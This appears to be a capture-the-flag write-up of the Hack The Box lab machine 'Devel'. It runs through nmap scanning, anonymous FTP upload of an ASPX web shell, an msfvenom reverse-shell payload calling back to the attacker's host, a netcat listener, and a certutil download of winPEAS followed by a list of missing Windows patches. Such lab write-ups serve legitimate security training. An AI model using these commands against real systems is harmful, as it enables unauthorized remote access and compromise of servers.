# Devel
## Reconnaissance

* Performed TCP scans using Nmap. (Did not include UDP and other TCP scans)
```
sudo nmap -sC -sS -sV -A 10.10.10.5
```
* The results of the Nmap show that TCP port 21 and 80 are open. Target machine OS is likely Windows Server 2008 R2.
* Google search revealed that IIS/7.5 is mapped to Windows Server 2008 R2

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

* Anonymous FTP login allowed

```
ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
ftp> 
```

* Test upload of aspx file

```
locate webshell | grep aspx
/usr/share/webshells/asp
/usr/share/webshells/aspx
/usr/share/webshells/asp/cmd-asp-5.1.asp
/usr/share/webshells/asp/cmdasp.asp
/usr/share/webshells/aspx/cmdasp.aspx
cp /usr/share/webshells/aspx/cmdasp.aspx .

ftp> put cmdasp.aspx
local: cmdasp.aspx remote: cmdasp.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1442 bytes sent in 0.00 secs (31.2545 MB/s)
```

* Access cmdasp.aspx and test out code execution
```
http://10.10.10.5/cmdasp.aspx
```

```
whoami
iis apppool\web


systeminfo
Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ££
System Boot Time:          7/11/2020, 2:03:26 ££
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.023 MB
Available Physical Memory: 677 MB
Virtual Memory: Max Size:  2.047 MB
Virtual Memory: Available: 1.473 MB
Virtual Memory: In Use:    574 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
```

* Perform Web Recon meanwhile

```
gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,php,aspx,asp -t 50
```
## Weaponization
* Create aspx reverse shell and upload into FTP
```
msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST=10.10.14.10 -f aspx -o reverse.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2747 bytes
Saved as: reverse.aspx

## Delivery and Exploitation
ftp> put reverse.aspx
local: reverse.aspx remote: reverse.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2782 bytes sent in 0.00 secs (31.9653 MB/s)
```

* Access reverse.aspx for reverse web shell
```
http://10.10.10.5/reverse.aspx
```

* Web shell obtained
```
kali@kali:~/HTB/devel$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.5] 49159
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>
whoami                                                  
iis apppool\web   
```

## Privilege Escalation

* Set up python server hosting [winpeas.bat](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) (privilege escalation checker)
```
sudo python -m SimpleHTTPServer 80                                                        
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 ...
```

* Fetch winpeas.bat using certutil and execute

```
c:\inetpub\wwwroot>certutil -urlcache -split -f http://10.10.14.10/winPEAS.bat c:\inetpub\wwwroot\winPEAS.bat    
certutil -urlcache -split -f http://10.10.14.10/winPEAS.bat c:\inetpub\wwwroot\winPEAS.bat
****  Online  ****
  0000  ...
  7f99
CertUtil: -URLCache command completed successfully.
```

* Potential vulnerabilities to exploit. Note Original Install Date:17/3/2017 when searching for exploits to test.
```
"Microsoft Windows 7 Enterprise   " 
[i] Possible exploits (https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)
No Instance(s) Available.
MS11-080 patch is NOT installed! (Vulns: XP/SP3,2K3/SP3-afd.sys)
No Instance(s) Available.
MS16-032 patch is NOT installed! (Vulns: 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon)
No Instance(s) Available.
MS11-011 patch is NOT installed! (Vulns: XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa)
No Instance(s) Available.
MS10-59 patch is NOT installed! (Vulns: 2K8,Vista,7/SP0-Chimichurri)
No Instance(s) Available.
MS10-21 patch is NOT installed! (Vulns: 2K/SP4,XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP0/1/2,7/SP0-Win Kernel)
No Instance(s) Available.
MS10-092 patch is NOT installed! (Vulns: 2K8/SP0/1/2,Vista/SP1/2,7/SP0-Task Sched)
No Instance(s) Available.
MS10-073 patch is NOT installed! (Vulns: XP/SP2/3,2K3/SP2/2K8/SP2,Vista/SP1/2,7/SP0-Keyboard Layout)
No Instance(s) Available.
MS17-017 patch is NOT installed! (Vulns: 2K8/SP2,Vista/SP2,7/SP1-Registry Hive Loading)
No Instance(s) Available.
MS10-015 patch is NOT installed! (Vulns: 2K,XP,2K3,2K8,Vista,7-User Mode to Ring)
No Instance(s) Available.
MS08-025 patch is NOT installed! (Vulns: 2K/SP4,XP/SP2,2K3/SP1/2,2K8/SP0,Vista/SP0/1-win32k.sys)
No Instance(s) Available.
MS06-049 patch is NOT installed! (Vulns: 2K/SP4-ZwQuerySysInfo)
No Instance(s) Available.
MS06-030 patch is NOT installed! (Vulns: 2K,XP/SP2-Mrxsmb.sys)
No Instance(s) Available.
MS05-055 patch is NOT installed! (Vulns: 2K/SP4-APC Data-Free)
No Instance(s) Available.
MS05-018 patch is NOT installed! (Vulns: 2K/SP3/4,XP/SP1/2-CSRSS)
No Instance(s) Available.
MS04-019 patch is NOT installed! (Vulns: 2K/SP2/3/4-Utility Manager)
No Instance(s) Available.
MS04-011 patch is NOT installed! (Vulns: 2K/SP2/3/4,XP/SP0/1-LSASS service BoF)
No Instance(s) Available.
MS04-020 patch is NOT installed! (Vulns: 2K/SP4-POSIX)
No Instance(s) Available.
MS14-040 patch is NOT installed! (Vulns: 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-afd.sys Dangling Pointer)
No Instance(s) Available.
MS16-016 patch is NOT installed! (Vulns: 2K8/SP1/2,Vista/SP2,7/SP1-WebDAV to Address)
No Instance(s) Available.
MS15-051 patch is NOT installed! (Vulns: 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys)
No Instance(s) Available.
MS14-070 patch is NOT installed! (Vulns: 2K3/SP2-TCP/IP) 
No Instance(s) Available.
MS13-005 patch is NOT installed! (Vulns: Vista,7,8,2008,2008R2,2012,RT-hwnd_broadcast)
No Instance(s) Available.
MS13-053 patch is NOT installed! (Vulns: 7SP0/SP1_x86-schlamperei)
No Instance(s) Available.
MS13-081 patch is NOT installed! (Vulns: 7SP0/SP1_x86-track_popup_menu)
```


